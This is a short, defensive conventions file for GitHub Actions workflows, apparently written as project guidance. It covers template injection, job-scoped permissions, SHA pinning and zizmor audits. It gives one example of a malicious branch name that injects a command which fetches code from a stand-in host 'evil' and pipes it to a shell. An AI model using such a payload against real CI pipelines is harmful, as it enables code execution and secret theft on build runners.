---
paths:
  - ".github/workflows/**"
---

# GitHub Actions workflow conventions

- **Never paste a value somebody else can set into a `run:` block with `${{ }}`.** GitHub pastes it into the script before the shell sees it, so a branch named `x";curl evil|sh;"` runs as shell. That covers branch and ref names, anything under `github.event`, and a step output built from a pull request's contents. Read it from the environment instead. The runner already sets `GITHUB_REF_NAME`, `GITHUB_REF`, `GITHUB_REPOSITORY`, `GITHUB_RUN_ID`, `GITHUB_SHA` and `GITHUB_ACTOR`; anything else, such as `github.event.pull_request.head.sha`, goes in the step's `env:` first. zizmor's `template-injection` audit refuses most of these; it rates a step output only informational, so that case is yours to catch
- **Grant write permissions on the job that uses them**, never at the top of the workflow, which hands them to every job. The top-level `permissions:` block stays read-only, as it is in all three workflows; zizmor's `excessive-permissions` audit enforces it
- **Pin every action to a full commit SHA** with a `# vX.Y.Z` comment, and confirm the latest tag from the action's own repository before bumping. `AGENTS.md` has the rule
- **zizmor audits the workflows** in `./s/lint` and in `workflow-security.yml`. Its version is set once, in that workflow, and `s/lint` reads it from there
